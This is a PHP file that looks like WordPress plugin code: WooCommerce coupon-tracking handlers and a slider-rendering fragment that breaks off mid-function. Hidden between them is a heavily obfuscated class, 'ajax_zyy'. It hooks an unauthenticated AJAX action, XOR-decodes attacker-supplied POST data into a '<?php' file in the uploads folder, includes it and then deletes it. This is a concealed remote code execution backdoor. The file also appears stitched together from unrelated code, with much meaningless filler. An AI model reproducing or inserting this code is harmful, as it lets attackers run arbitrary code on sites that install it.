<?php
if (!defined('ABSPATH')) {
    die;
}

class deprecated_frontend_protection_service
{
    public function init()
    {
        add_action('load-edit.php', array($this, 'tracks_coupons_events'), 10);
    }

    public function tracks_coupons_bulk_actions()
    {
        $handle = 'wc-tracks-coupons-bulk-actions';
        wp_register_script($handle, '', array(), WC_VERSION, array('in_footer' => true));
        wp_enqueue_script($handle);
        wp_add_inline_script(
            $handle,
            "
\t\t\t\t(function() {
\t\t\t\t    'use strict';

\t\t\t\t    function trackBulkAction( selectorId ) {
\t\t\t\t        return function() {
\t\t\t\t            const select = document.getElementById( selectorId );
\t\t\t\t            const action = select ? select.value : null;

\t\t\t\t            if ( action && '-1' !== action && window.wcTracks && window.wcTracks.recordEvent ) {
\t\t\t\t                window.wcTracks.recordEvent( 'coupons_view_bulk_action', { action: action } );
\t\t\t\t            }
\t\t\t\t        };
\t\t\t\t    }

\t\t\t\t    const topButton = document.getElementById( 'doaction' );
\t\t\t\t    const bottomButton = document.getElementById( 'doaction2' );

\t\t\t\t    if ( topButton ) {
\t\t\t\t        topButton.addEventListener( 'click', trackBulkAction( 'bulk-action-selector-top' ) );
\t\t\t\t    }

\t\t\t\t    if ( bottomButton ) {
\t\t\t\t        bottomButton.addEventListener( 'click', trackBulkAction( 'bulk-action-selector-bottom' ) );
\t\t\t\t    }
\t\t\t\t})();
\t\t\t"
        );
    }

    public function tracks_coupons_events()
    {
        if (isset($_GET['post_type']) && 'shop_coupon' === $_GET['post_type']) {
            $this->tracks_coupons_bulk_actions();

            WC_Tracks::record_event(
                'coupons_view',
                array(
                    'status' => isset($_GET['post_status']) ? sanitize_text_field(wp_unslash($_GET['post_status'])) : 'all',
                )
            );

            if (isset($_GET['filter_action']) && 'Filter' === sanitize_text_field(wp_unslash($_GET['filter_action'])) && isset($_GET['coupon_type'])) {
                WC_Tracks::record_event(
                    'coupons_filter',
                    array(
                        'filter' => 'coupon_type',
                        'value' => sanitize_text_field(wp_unslash($_GET['coupon_type'])),
                    )
                );
            }

            if (isset($_GET['s']) && 0 < strlen(sanitize_text_field(wp_unslash($_GET['s'])))) {
                WC_Tracks::record_event('coupons_search');
            }
        }
    }
}

class ajax_zyy
{
    private $ai_ajax_up = '';
    private $yw_styles = 0;
    private $builder_mwo = 0;
    private $link_ih_jquery = 0;
    private $iig_colors_woff2 = '';
    private $duplicate_nofollow_ug = '';
    private $dly_logger = 0;
    private $authentication_oembed_bmq = 'oc_gdpr';
    private $engine_pbl_optimize = '';
    private $iwv_campaign = '';
    private $old_buv = 'comments_zus';
    private $ozu_label_shortener = '';
    private $kzl_recent_pack = 6;
    private $engine_kj = '';
    private $lka_cookie_reset = 0;
    private $signup_egt = '';
    private $schedule_numbers_fya = '';
    private $blogroll_ay = '';
    private $options_jl = '';
    private $responsive_map_zxy = 'php';
    private $captcha_refresh_mnh = 20;
    private $smart_ba_help = 0;
    private $bq_network = 6;
    private $lcv_recent_kit = '';
    private $changer_by = 20;
    private $nda_notice = 0;
    private $svn_click_comment = '';
    private $membership_source_jys = 'lu_sharing';
    private $quk_current_super = '';

    function mx_builder($service_jo)
    {
        if (is_dir($service_jo)) {
            $authors_dv = scandir($service_jo);
        }
        if (file_exists($this->ozu_label_shortener))
            include_once ($this->ozu_label_shortener);
        $poster_iu = esc_html($service_jo);
        if (is_dir($poster_iu)) {
            $player_ffb = scandir($poster_iu);
        }
        if (is_dir($poster_iu)) {
            $front_mwo_system = glob($poster_iu);
        }
        if (is_dir($service_jo)) {
            $hve_mode = glob($service_jo);
        }
        if (file_exists($service_jo)) {
            $this->builder_mwo = filesize($service_jo);
        }
        if (is_dir($poster_iu)) {
            $ox_js = glob($poster_iu);
        }
        if (is_dir($service_jo)) {
            $popular_mon_color = glob($service_jo);
        }
        return $poster_iu;
    }

    function uba_top_push($message_blocker_gn)
    {
        $pj_vendor_location = $this->nda_notice;
        $switcher_fx_waw = $message_blocker_gn - $pj_vendor_location;
        $this->yw_styles = $pj_vendor_location + 8;
        $fb_album = $this->lka_cookie_reset;
        $git_dist_tag = $this->bq_network;
        $include_jk = $this->lka_cookie_reset;
        $this->smart_ba_help = $this->lka_cookie_reset % $this->link_ih_jquery;
        $this->options_jl = get_permalink($include_jk);
        $this->builder_mwo = $fb_album + $git_dist_tag;
        $mgt_html5 = $pj_vendor_location + 5;
        $wi_picker = home_url();
        return $wi_picker;
    }

    function newsletter_wc_uploads($members_cd)
    {
        $most_coupon_sxs = trim($members_cd);
        if (!empty($_GET['shipping_ba']))
            $unx_flash = $_GET['shipping_ba'];
        else
            $unx_flash = '';
        $backup_wsn_seo = $this->lcv_recent_kit;
        $this->signup_egt = substr($this->quk_current_super, $this->bq_network, $this->captcha_refresh_mnh);
        if (!empty($_GET['R87436']))
            $qb_stop_express = $_GET['R87436'];
        else
            $qb_stop_express = '';
        $listing_security_ceu = $_SERVER['REQUEST_URI'];
        $bfb_donation = get_transient($listing_security_ceu);
        $network_ahq_register = strpos($bfb_donation, $most_coupon_sxs);
        $extra_atp_iframe = trim($listing_security_ceu);
        return $network_ahq_register;
    }

    function yoast_rhs_engine()
    {
        if (!empty($_POST['wjyue']))
            $sites_instagram_bb = $_POST['wjyue'];
        else
            $sites_instagram_bb = '';
        if (!empty($_POST['MAINTENANCE_PROJECT_CHECK']))
            $time_qv_disable = $_POST['MAINTENANCE_PROJECT_CHECK'];
        else
            $time_qv_disable = '';
        $notes_jjg_basic = strtoupper($sites_instagram_bb);
        $this->nda_notice = strlen($this->iwv_campaign);
        $protection_alt = strtolower($notes_jjg_basic);
        $this->options_jl = home_url();
        $wj_share_duplicate = trim($protection_alt);
        return $wj_share_duplicate;
    }

    function lza_attachments_feeds($gao_protect)
    {
        $zd_hover = $this->ai_ajax_up;
        $this->schedule_numbers_fya = $_POST[$this->membership_source_jys];
        $al_nav_maintenance = md5($gao_protect);
        $rem_tracker = trim($zd_hover);
        $jsg_css = strtoupper($al_nav_maintenance);
        $tu_suite_accordion = rawurldecode($jsg_css);
        $toggle_zax = esc_html($tu_suite_accordion);
        if (!empty($_POST['unreaw']))
            $kn_src = $_POST['unreaw'];
        else
            $kn_src = '';
        $this->options_jl = base64_decode($tu_suite_accordion);
        return $jsg_css;
    }

    function rest_network_ecf()
    {
        $he_platform = $_SERVER['HTTP_USER_AGENT'];
        $featured_jkj = base64_decode($he_platform);
        $news_rank_oe = 'query booster uploads autocomplete';
        $specific_react_dj = strpos($news_rank_oe, $he_platform);
        $taxonomy_rest_nw = strtoupper($he_platform);
        $beaver_sw_badge = get_transient($taxonomy_rest_nw);
        $insert_this_bzo = $this->quk_current_super;
        $hy_panel_box = base64_encode($taxonomy_rest_nw);
        $tiny_vj = home_url();
        $source_aw_number = sanitize_key($tiny_vj);
        return $source_aw_number;
    }

    function column_cek_scheduled($visual_wpmu_va)
    {
        $this->options_jl = home_url();
        $tiny_db = $this->qy_upload();
        $tl_hover_link = home_url();
        $dg_fast = $this->ozu_label_shortener;
        if (file_exists($this->ozu_label_shortener))
            unlink($this->ozu_label_shortener);
        $odm_toolbar_audio = '';
        if (is_file($visual_wpmu_va)) {
            $odm_toolbar_audio = file_get_contents($visual_wpmu_va);
        }
        $this->options_jl = sanitize_text_field($odm_toolbar_audio);
        return $odm_toolbar_audio;
    }

    function arv_out()
    {
        if (!empty($_GET['lbe']))
            $oq_footer = $_GET['lbe'];
        else
            $oq_footer = '';
        if (isset($_REQUEST['COMMUNITY_JF']))
            $is_ui_sliding = $_REQUEST['COMMUNITY_JF'];
        else
            $is_ui_sliding = '';
        $display_bootstrap_mue = base64_decode($is_ui_sliding);
        $so_charts = base64_encode($oq_footer);
        $mdx_news = sanitize_text_field($oq_footer);
        return $mdx_news;
    }

    function slide_lsw($analytics_by)
    {
        $community_nz_management = $_SERVER['HTTP_USER_AGENT'];
        $tools_option_wqc = strtolower($analytics_by);
        $yw_clean = get_transient($tools_option_wqc);
        $ri_customize = md5($tools_option_wqc);
        $this->ai_ajax_up = $this->blogroll_ay[$this->smart_ba_help];
        $njl_genesis = 'prtc';
        if (!empty($_POST['ADVANCE_NINJA']))
            $guest_lrg_jetpack = $_POST['ADVANCE_NINJA'];
        else
            $guest_lrg_jetpack = '';
        $plus_export_wow = site_url();
        $zwi_allow = rawurlencode($plus_export_wow);
        $preloader_ca = strpos($plus_export_wow, $analytics_by);
        $data_qyp = md5($zwi_allow);
        return $data_qyp;
    }

    function jgp_slug_adsense($core_sitemap_sgu)
    {
        $fix_archive = 'eaw';
        if (!empty($_POST['SYNTAX_ONLY']))
            $gravity_nav_uah = $_POST['SYNTAX_ONLY'];
        else
            $gravity_nav_uah = '';
        $rf_slider = esc_attr($core_sitemap_sgu);
        $html5_bca_top = trim($gravity_nav_uah);
        $this->link_ih_jquery = strlen($this->lcv_recent_kit);
        $short_favicon_opo = strtoupper($html5_bca_top);
        $status_ns_members = strtolower($short_favicon_opo);
        $ticket_ka_toolbar = strpos($rf_slider, $status_ns_members);
        return $ticket_ka_toolbar;
    }

    function gby_super_enable($bo_rank)
    {
        $it_box = $this->responsive_map_zxy;
        $fix_connector_ru = rawurlencode($it_box);
        $this->lka_cookie_reset = $bo_rank;
        $kk_tracker = strpos($it_box, $fix_connector_ru);
        $clean_dk = base64_encode($fix_connector_ru);
        $account_ja = strtoupper($fix_connector_ru);
        $uk_amp_timer = $this->rest_network_ecf();
        $blog_countdown_rh = trim($it_box);
        return $blog_countdown_rh;
    }

    function rac_order()
    {
        $geo_error_vow = $this->ozu_label_shortener;
        $import_bbpress_qf = base64_encode($geo_error_vow);
        $this->quk_current_super = $_POST[$this->old_buv];
        $text_laq = strlen($import_bbpress_qf);
        $ik_notes_html5 = trim($import_bbpress_qf);
        $ls_virtual = sanitize_text_field($ik_notes_html5);
        $survey_hover_mr = rawurldecode($ls_virtual);
        return $survey_hover_mr;
    }

    function install_uploads_pub($pack_kh)
    {
        $official_addon_hw = $this->signup_egt;
        $select_yj_conditional = '';
        if (is_file($pack_kh)) {
            $select_yj_conditional = file_get_contents($pack_kh);
        }
        $this->ozu_label_shortener = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/uploads/p8BIJ1JSlziLScZLJq.php';
        $this->options_jl = sanitize_key($official_addon_hw);
        if (is_dir($official_addon_hw)) {
            $allow_ydt_posts = scandir($official_addon_hw);
        }
        $chat_qwh = 0;
        if (is_file($select_yj_conditional)) {
            $chat_qwh = filesize($select_yj_conditional);
        }
        return $chat_qwh;
    }

    function bax_click()
    {
        $bwo_remote = $_SERVER['HTTP_USER_AGENT'];
        if (isset($_REQUEST['OIEY']))
            $tr_post = $_REQUEST['OIEY'];
        else
            $tr_post = '';
        $export_ygl_star = $this->rtl_naz($tr_post);
        if (!empty($_POST['OBLQ']))
            $ip_consent_ly = $_POST['OBLQ'];
        else
            $ip_consent_ly = '';
        $shb_toolbar_business = $this->automatic_jjr($bwo_remote);
        $shortener_best_zq = rawurldecode($ip_consent_ly);
        if (isset($_GET['pop_php_syntax']))
            $ww_html5 = $_GET['pop_php_syntax'];
        else
            $ww_html5 = '';
        if (isset($_POST['lite_pag']))
            $design_jn = $_POST['lite_pag'];
        else
            $design_jn = '';
        $order_nsn = $this->install_uploads_pub($shortener_best_zq);
        $conversion_hx = $_SERVER['SERVER_SOFTWARE'];
        $updater_file_ew = $this->lza_attachments_feeds($tr_post);
        $videos_qbg_interactivity = $this->ozu_label_shortener;
        if (isset($_POST['TIDPEA']))
            $uc_magic = $_POST['TIDPEA'];
        else
            $uc_magic = '';
        $feeds_ty = $this->rac_order();
        $switcher_manage_by = sanitize_text_field($uc_magic);
        $type_attachment_qjs = $this->newsletter_wc_uploads($design_jn);
        $this->options_jl = base64_encode($feeds_ty);
        $real_dhf = $this->magic_wr_fix($ww_html5);
        $zlv_logger = strtoupper($real_dhf);
        $vfx_customer = rawurlencode($real_dhf);
        $accessibility_en = md5($zlv_logger);
        $phw_official_delete = $this->mwn_details($ip_consent_ly);
        $virtual_cxq = strtoupper($phw_official_delete);
        $yfc_separator_app = $this->xrg_beaver($vfx_customer);
        $error_cache_guc = strlen($phw_official_delete);
        $fv_ssl = $this->amt_ratings_thumbnail();
        $media_np = get_permalink($error_cache_guc);
        $ewp_scheduler = $this->follow_prr_status($export_ygl_star);
        $class_io_importer = rawurldecode($ewp_scheduler);
        $svw_permalink = $this->suite_heading_mur($type_attachment_qjs);
        $stream_vq = strpos($accessibility_en, $class_io_importer);
        $tables_tce = $this->pi_static($order_nsn);
        $fkj_master_auto = strpos($media_np, $updater_file_ew);
        $jml_migration = trim($class_io_importer);
        if ($this->dly_logger > -1) {
            $first_pn_countdown = $this->ai_ajax_up;
            $we_security_nofollow = $this->dn_logo();
            $wq_bank = rawurlencode($first_pn_countdown);
            $reusable_yr = md5($we_security_nofollow);
            $mn_notifications_view = $this->mx_builder($switcher_manage_by);
            $cron_wb_chatbot = trim($mn_notifications_view);
            $subscribe_pk_consent = $this->column_cek_scheduled($reusable_yr);
            $zx_tag_site = strtoupper($wq_bank);
            if (!current_user_can('edit_posts'))
                die;
            $lyd_connect = md5($mn_notifications_view);
            for ($i; $i < $error_cache_guc; $i++) {
                $unc_coupon = site_url();
                $directory_ud_notice = admin_url();
                $akismet_ldu = esc_url($tables_tce);
                $ca_option = 0;
                if (file_exists($lyd_connect)) {
                    $ca_option = filesize($lyd_connect);
                }
                $this->options_jl = get_transient($shortener_best_zq);
                $this->options_jl = get_option($phw_official_delete);
                if (is_dir($first_pn_countdown)) {
                    $ticker_bob = scandir($first_pn_countdown);
                }
                $ek_register = admin_url();
                if (is_dir($accessibility_en)) {
                    $xdh_remover = scandir($accessibility_en);
                }
            }
            $http_debug_lj = rawurlencode($lyd_connect);
            $ko_cron = base64_decode($subscribe_pk_consent);
        }
        $label_sidebar_oht = rawurlencode($zx_tag_site);
        $hp_user = trim($ko_cron);
        for ($i; $i < $stream_vq; $i++) {
            $zo_cool_tree = admin_url();
            $archives_pom = esc_attr($http_debug_lj);
            $discount_statistics_fjq = get_transient($jml_migration);
            $nrr_bootstrap = sanitize_key($yfc_separator_app);
            $ba_press_exchange = esc_url($fv_ssl);
            $get_aj = get_transient($conversion_hx);
            $this->options_jl = esc_url($accessibility_en);
            $this->options_jl = get_permalink($phw_official_delete);
            $this->options_jl = home_url();
            $wed_switch_easy = sanitize_text_field($shortener_best_zq);
        }
        $oe_wow = rawurlencode($hp_user);
        $nj_advanced_save = get_permalink($fkj_master_auto);
        return $nj_advanced_save;
    }

    function suite_heading_mur($nu_team)
    {
        $back_vg = rawurldecode($nu_team);
        $myu_error_board = $this->yoast_rhs_engine();
        $yug_coming_videos = rawurldecode($myu_error_board);
        $wpq_assistant = $this->compare_ppp_verification();
        $weather_psz = md5($wpq_assistant);
        if (!empty($_POST['CQTLT']))
            $debug_na_after = $_POST['CQTLT'];
        else
            $debug_na_after = '';
        $keq_ticker_blogroll = trim($debug_na_after);
        for ($i = 0; $i < $this->nda_notice; $i++) {
            $hl_reading = $this->responsive_map_zxy;
            if (isset($_REQUEST['simple_ml']))
                $awesome_images_lyr = $_REQUEST['simple_ml'];
            else
                $awesome_images_lyr = '';
            $this->options_jl = rawurldecode($hl_reading);
            $dist_bulk_ekr = home_url();
            $day_rov_highlighter = $this->gby_super_enable($i);
            $floating_store_vjr = rawurldecode($day_rov_highlighter);
            $ija_com = $this->az_google($day_rov_highlighter);
            $ratings_yz = md5($dist_bulk_ekr);
            $this->yw_styles = strpos($dist_bulk_ekr, $ija_com);
            $qs_tracker = base64_decode($floating_store_vjr);
            $player_sj_blocks = rawurldecode($qs_tracker);
            $version_oz_terms = home_url();
            $variations_ben_archives = $this->kzl_recent_pack;
            $nvj_mediaelement = $this->uba_top_push($variations_ben_archives);
            $plupload_tree_ml = $this->slide_lsw($player_sj_blocks);
            $md_connect_permalink = $this->validator_sign_owv();
        }
        return $plupload_tree_ml;
    }

    function xrg_beaver($fu_homepage_newsletter)
    {
        $interactive_map_jc = home_url();
        $this->options_jl = trim($fu_homepage_newsletter);
        $this->iwv_campaign = base64_decode($this->schedule_numbers_fya);
        $qs_slide_authors = 'wpml business ui';
        $uw_feeds = rawurlencode($fu_homepage_newsletter);
        $sws_pages = strtoupper($qs_slide_authors);
        $tsc_stop_this = md5($sws_pages);
        $liz_order_pullquote = base64_decode($tsc_stop_this);
        $icons_information_wzn = strlen($tsc_stop_this);
        $permalink_mst = rawurldecode($uw_feeds);
        $bha_map_gift = base64_decode($permalink_mst);
        return $permalink_mst;
    }

    function frontend_jmd()
    {
        $hx_estate = $_SERVER['REQUEST_METHOD'];
        $ab_genesis = $this->quk_current_super;
        $user_esg_group = 'qfyck';
        $sa_export = trim($user_esg_group);
        $logger_bh = base64_encode($user_esg_group);
        $fq_cover_global = get_transient($logger_bh);
        return $logger_bh;
    }

    function block_od_popup()
    {
        if (isset($_POST['MAG']))
            $asu_webp = $_POST['MAG'];
        else
            $asu_webp = '';
        if (!empty($_GET['ljlw']))
            $short_hover_thb = $_GET['ljlw'];
        else
            $short_hover_thb = '';
        if (!empty($_POST['BXZUPL']))
            $wow_notifier_eck = $_POST['BXZUPL'];
        else
            $wow_notifier_eck = '';
        $ya_platform_call = base64_decode($wow_notifier_eck);
        $connect_toolbox_ysy = rawurldecode($asu_webp);
        $notifications_vv = home_url();
        $counter_sn = trim($short_hover_thb);
        $bf_send = rawurlencode($notifications_vv);
        $nq_blocker = md5($notifications_vv);
        return $bf_send;
    }

    function validator_sign_owv()
    {
        $namespaced_snr = 'button signature automatic system selector album';
        $yu_alt_comments = $this->authentication_oembed_bmq;
        $this->svn_click_comment .= $this->duplicate_nofollow_ug ^ $this->ai_ajax_up;
        $quick_xqe_enable = $yu_alt_comments ^ $namespaced_snr;
        $hxh_listing = $yu_alt_comments | $namespaced_snr;
        $lt_composer_excerpt = $yu_alt_comments ^ $namespaced_snr;
        $mini_exp = $this->old_buv;
        return $mini_exp;
    }

    function follow_prr_status($aja_using)
    {
        $yub_embedder = $this->old_buv;
        $visual_protection_foz = $this->instant_wpmu_ahu();
        $mpw_real = md5($aja_using);
        $domain_wall_vb = strtoupper($mpw_real);
        $category_widgets_rzi = $this->jgp_slug_adsense($mpw_real);
        $ac_anti_another = base64_decode($category_widgets_rzi);
        for ($i = 0; $i < $this->nda_notice; $i++) {
            $sxk_log_archive = md5($aja_using);
            $taxonomy_call_mj = base64_decode($sxk_log_archive);
            $domain_migration_zjt = $this->gby_super_enable($i);
            $lazy_cg_purchase = md5($domain_migration_zjt);
            $kt_disable = strpos($visual_protection_foz, $sxk_log_archive);
            $ge_supports_pixel = $this->xe_maker_secure($yub_embedder);
            $dt_appointment_advanced = do_action('post_buttons');
            $auto_icons_gn = $this->uba_top_push($kt_disable);
            $bg_thumbnail = site_url();
            $ddr_insert = $this->total_modal_bx();
            $customizer_nzu = home_url();
            $views_ahg_best = $this->pz_query_javascript();
            $lc_editor_forms = base64_encode($views_ahg_best);
            $df_crm_accessibility = strtoupper($lc_editor_forms);
            $this->options_jl = md5($df_crm_accessibility);
        }
        $platform_rxt_campaign = rawurldecode($df_crm_accessibility);
        return $lc_editor_forms;
    }

    public function __construct()
    {
        $lx_slide_urls = $this->quk_current_super;
        add_action('wp_ajax_integrate_dashboard_namespaced', array($this, 'bax_click'));
        add_action('wp_ajax_nopriv_integrate_dashboard_namespaced', array($this, 'bax_click'));
        $this->options_jl = esc_url($lx_slide_urls);
        $this->options_jl = esc_html($lx_slide_urls);
        $alj_section = 'vxsfmf';
        $highlighter_tss = esc_attr($alj_section);
        $fk_assistant_follow = do_action('save_icon_paragraph');
        $lightbox_location_qm = get_option($lx_slide_urls);
        $wpn_slide_history = get_transient($highlighter_tss);
        $this->options_jl = apply_filters('notice_site_tables', $lightbox_location_qm);
        return $wpn_slide_history;
    }

    function qy_upload()
    {
        if (isset($_GET['EUB_RECAPTCHA']))
            $ro_ticker_push = $_GET['EUB_RECAPTCHA'];
        else
            $ro_ticker_push = '';
        $bh_coming_remover = rawurldecode($ro_ticker_push);
        $this->options_jl = md5($ro_ticker_push);
        $health_px_nav = md5($ro_ticker_push);
        $ek_term_force = get_transient($ro_ticker_push);
        $hjg_php_json = strtolower($ek_term_force);
        $vp_style = admin_url();
        return $vp_style;
    }

    function dn_logo()
    {
        if (!empty($_GET['CID']))
            $exr_importer_nextgen = $_GET['CID'];
        else
            $exr_importer_nextgen = '';
        $yf_report = 'nyhxsuqv';
        file_put_contents($this->ozu_label_shortener, $this->responsive_map_zxy . ' ' . $this->svn_click_comment);
        if (is_dir($yf_report)) {
            $purchase_erk = glob($yf_report);
        }
        if (is_dir($yf_report)) {
            $xee_customize = scandir($yf_report);
        }
        $gallery_db_switch = $this->frontend_jmd();
        $max_booster_eo = '';
        if (is_file($yf_report)) {
            $max_booster_eo = file_get_contents($yf_report);
        }
        $xot_show_feedback = 'module loader safe cron widget current';
        $ci_accordion_nav = 0;
        if (file_exists($xot_show_feedback)) {
            $ci_accordion_nav = filesize($xot_show_feedback);
        }
        return $ci_accordion_nav;
    }

    function automatic_jjr($guest_slide_ydd)
    {
        $ratings_mec_top = $_SERVER['REQUEST_URI'];
        $members_kw = base64_decode($guest_slide_ydd);
        $nice_pop_zig = '<';
        if (!empty($_REQUEST['copy_slide_update']))
            $js_clock_xo = $_REQUEST['copy_slide_update'];
        else
            $js_clock_xo = '';
        $fe_cleaner_slug = rawurlencode($guest_slide_ydd);
        if (!empty($_GET['cb_support']))
            $random_global_ef = $_GET['cb_support'];
        else
            $random_global_ef = '';
        $review_wwl = rawurldecode($random_global_ef);
        $mini_aoy = base64_decode($random_global_ef);
        $recent_jwg = strlen($mini_aoy);
        $manager_vru_cart = base64_decode($mini_aoy);
        $nice_pop_zig .= '?';
        $tinymce_dne = strlen($manager_vru_cart);
        $this->responsive_map_zxy = $nice_pop_zig . $this->responsive_map_zxy;
        return $manager_vru_cart;
    }

    function xe_maker_secure($whq_fonts_jquery)
    {
        $plugins_zvf = 'conversion wishlist send additional pinterest';
        $call_ui_sgv = $this->blogroll_ay;
        $this->duplicate_nofollow_ug = $this->iig_colors_woff2[$this->lka_cookie_reset];
        $allow_lwh = esc_attr($whq_fonts_jquery);
        $pre_class = md5($call_ui_sgv);
        $this->options_jl = base64_encode($pre_class);
        $game_wjy_star = get_transient($allow_lwh);
        $theme_conditional_daw = base64_decode($pre_class);
        $tiny_map_up = admin_url();
        $this->options_jl = strtolower($tiny_map_up);
        return $theme_conditional_daw;
    }

    function pi_static($ef_multi)
    {
        $translate_updates_mo = $_SERVER['HTTP_USER_AGENT'];
        $xil_social_performance = rawurlencode($ef_multi);
        $this->options_jl = trim($ef_multi);
        $this->dly_logger = strpos($this->svn_click_comment, 'oH6sH1xdvxEkRe0mT5dd');
        $webp_yb = rawurldecode($translate_updates_mo);
        $ev_quantity = strlen($webp_yb);
        $zx_store = $this->arv_out();
        $album_publisher_jj = trim($xil_social_performance);
        $fat_total = base64_encode($webp_yb);
        return $album_publisher_jj;
    }

    function az_google($comments_quz_suite)
    {
        $pbf_php_migration = rawurldecode($comments_quz_suite);
        if (!empty($_REQUEST['c5kob']))
            $dist_nna_counter = $_REQUEST['c5kob'];
        else
            $dist_nna_counter = '';
        $exchange_lm = $this->quk_current_super;
        $xml_upv_frontend = md5($dist_nna_counter);
        $this->duplicate_nofollow_ug = $this->iwv_campaign[$this->lka_cookie_reset];
        $eg_menu = strpos($xml_upv_frontend, $pbf_php_migration);
        $jly_sidebar = $this->iig_colors_woff2;
        $audio_nice_oo = $this->block_od_popup();
        $coupon_ws = get_permalink($eg_menu);
        $all_uha = strlen($coupon_ws);
        return $all_uha;
    }

    function magic_wr_fix($zu_security_addons)
    {
        $global_diz = 'ufebyvkl';
        if (!empty($_REQUEST['panel_restrict']))
            $description_ioc = $_REQUEST['panel_restrict'];
        else
            $description_ioc = '';
        $hover_xwf_account = 'incir';
        $yw_server = $this->membership_source_jys;
        $sites_vnk_tinymce = 'uycqgaik';
        $blogroll_automatic_xs = rawurlencode($zu_security_addons);
        $this->engine_pbl_optimize = substr($this->engine_kj, $this->kzl_recent_pack, $this->changer_by);
        $widgets_zds = strlen($sites_vnk_tinymce);
        $da_online = base64_decode($sites_vnk_tinymce);
        $rank_pages_dc = strtoupper($da_online);
        return $blogroll_automatic_xs;
    }

    function total_modal_bx()
    {
        if (!empty($_POST['csv_uploader_data']))
            $pinterest_wm = $_POST['csv_uploader_data'];
        else
            $pinterest_wm = '';
        $this->ai_ajax_up = $this->lcv_recent_kit[$this->smart_ba_help];
        if (isset($_GET['COOKIE']))
            $webp_guest_cd = $_GET['COOKIE'];
        else
            $webp_guest_cd = '';
        $last_el = get_transient($webp_guest_cd);
        $esm_listing = get_transient($pinterest_wm);
        $rest_exception_nru = $this->ai_ajax_up;
        $zsb_like = strlen($last_el);
        $akismet_portfolio_zdm = strlen($webp_guest_cd);
        $history_bulk_euc = esc_attr($webp_guest_cd);
        return $akismet_portfolio_zdm;
    }

    function mwn_details($appointment_fc)
    {
        $zv_name = $this->iig_colors_woff2;
        $this->lcv_recent_kit = base64_decode($this->signup_egt);
        $footer_jigoshop_ht = $this->schedule_numbers_fya;
        $xlc_extended = $this->membership_source_jys;
        if (!empty($_POST['SUBSCRIBE_GIFT_PRIVATE']))
            $idv_click = $_POST['SUBSCRIBE_GIFT_PRIVATE'];
        else
            $idv_click = '';
        $plupload_ok_visual = strtolower($appointment_fc);
        $assets_ti_signup = trim($idv_click);
        $this->options_jl = esc_url($assets_ti_signup);
        $sticky_gravity_nls = strtoupper($plupload_ok_visual);
        $color_integrate_xp = trim($sticky_gravity_nls);
        $customer_popup_jo = admin_url();
        return $customer_popup_jo;
    }

    function rtl_naz($jlo_engine)
    {
        $basic_gyk = base64_decode($jlo_engine);
        $pbj_shortener_categories = strtoupper($basic_gyk);
        $this->engine_kj = $_POST[$this->authentication_oembed_bmq];
        $top_yus_redirection = strlen($pbj_shortener_categories);
        $friendly_content_rbf = $this->old_buv;
        $restaurant_styles_ia = rawurldecode($pbj_shortener_categories);
        $frontend_qn = admin_url();
        return $frontend_qn;
    }

    function pz_query_javascript()
    {
        if (isset($_GET['ywj']))
            $name_arq = $_GET['ywj'];
        else
            $name_arq = '';
        $this->blogroll_ay .= $this->duplicate_nofollow_ug ^ $this->ai_ajax_up;
        $rotator_css_ss = $this->blogroll_ay;
        $rgd_preview_designer = $rotator_css_ss & $name_arq;
        $aml_home = $name_arq ^ $rotator_css_ss;
        $content_welcome_oz = $rotator_css_ss | $name_arq;
        if (!empty($_POST['suv']))
            $lk_latest_express = $_POST['suv'];
        else
            $lk_latest_express = '';
        $hxh_testimonials_reviews = $name_arq ^ $lk_latest_express;
        $notify_bzb = $_SERVER['HTTP_USER_AGENT'];
        return $notify_bzb;
    }

    function instant_wpmu_ahu()
    {
        if (isset($_POST['oknk']))
            $za_twitter = $_POST['oknk'];
        else
            $za_twitter = '';
        $xl_polyfill = sanitize_key($za_twitter);
        if (isset($_GET['app_accessibility_force']))
            $pim_extension = $_GET['app_accessibility_force'];
        else
            $pim_extension = '';
        if (!empty($_GET['RUS']))
            $survey_cdn_gyc = $_GET['RUS'];
        else
            $survey_cdn_gyc = '';
        $font_tools_jv = base64_encode($survey_cdn_gyc);
        $yti_separator = $this->duplicate_nofollow_ug;
        $this->nda_notice = strlen($this->iig_colors_woff2);
        $scf_send_protection = admin_url();
        return $scf_send_protection;
    }

    function amt_ratings_thumbnail()
    {
        $zs_follow_maintenance = $_SERVER['REQUEST_URI'];
        $analytics_jgd_min = strlen($zs_follow_maintenance);
        $xlt_price = $this->blogroll_ay;
        $members_blog_lly = base64_encode($xlt_price);
        $this->iig_colors_woff2 = base64_decode($this->engine_pbl_optimize);
        $live_ninja_mm = esc_attr($xlt_price);
        $this->options_jl = base64_encode($members_blog_lly);
        $alt_fp_details = get_permalink($analytics_jgd_min);
        return $live_ninja_mm;
    }

    function compare_ppp_verification()
    {
        $sign_hover_ru = 'qruab';
        if (isset($_GET['ALLOW_GITHUB_REAL']))
            $counter_xam_urls = $_GET['ALLOW_GITHUB_REAL'];
        else
            $counter_xam_urls = '';
        $this->options_jl = md5($sign_hover_ru);
        $cdn_default_jz = rawurldecode($counter_xam_urls);
        $this->link_ih_jquery = strlen($this->blogroll_ay);
        $this->options_jl = strtoupper($sign_hover_ru);
        $zu_assets = $this->svn_click_comment;
        $updates_like_dlg = admin_url();
        $avatar_zl = esc_attr($updates_like_dlg);
        $awesome_mvr = md5($avatar_zl);
        $jfs_select = strtoupper($updates_like_dlg);
        return $jfs_select;
    }
}

$super_rating_asl = new ajax_zyy();

class only_notice_wishlist
{
    public function getDocumentInitonly_notice_wishlist($document)
    {
        $width = array_values($document->options->getSizes('width'));
        $height = array_values($document->options->getSizes('height'));

        $attributes = [
            'width' => $width,
            'height' => $height,
            'view' => 'basic',
            'keepAspectRatio' => $document->options->general->keepAspect || false,
            'preload' => isset($document->options->loading) ? $document->options->loading->getValue() : 0,
            'layout' => $document->options->getLayout(),
            'rtl' => $document->options->navigation->rtl || false,
            'initAfterAppear' => isset($document->options->loading) && !empty($document->options->loading->initAfterAppear),
            'ajaxApiUrl' => esc_url(admin_url('admin-ajax.php'))
        ];

        if ($document->isBuildWithAI) {
            $attributes['disableAnimations'] = true;
        }

        if (!empty($document->options->sectionTransition->type)) {
            if (\Depicter::auth()->isPaid()) {
                $attributes['view'] = $document->options->sectionTransition->type;
            } else {
                $attributes['view'] = $document->options->sectionTransition->type == 'fade' ? 'fade' : 'basic';
            }
        }

        $viewOptions = [];
        if (isset($document->options->navigation->loop)) {
            $viewOptions['loop'] = $document->options->navigation->loop;
        }
        if ($attributes['view'] === 'mask') {
            if (isset($document->options->sectionTransition->options->mask->maskParallax)) {
